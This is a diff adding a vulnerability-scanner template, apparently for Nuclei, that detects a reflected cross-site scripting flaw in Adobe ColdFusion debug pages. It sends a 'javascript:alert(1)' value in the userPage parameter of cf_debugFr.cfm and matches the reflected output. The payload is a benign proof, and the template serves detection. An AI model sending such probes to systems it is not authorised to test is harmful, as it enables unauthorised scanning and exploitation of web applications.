@@ -1,0 +1,25 @@
+id: coldfusion-debug-xss
+info:
+  author: dhiyaneshDK
+  name: Adobe ColdFusion Debug Page XSS
+  reference: https://github.com/jaeles-project/jaeles-signatures/blob/master/common/coldfusion-debug-xss.yaml
+  severity: medium
+  tags: adobe,xss
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - '"cf_main_cf" src="javascript:alert(1)"'
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
+  - '{{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'
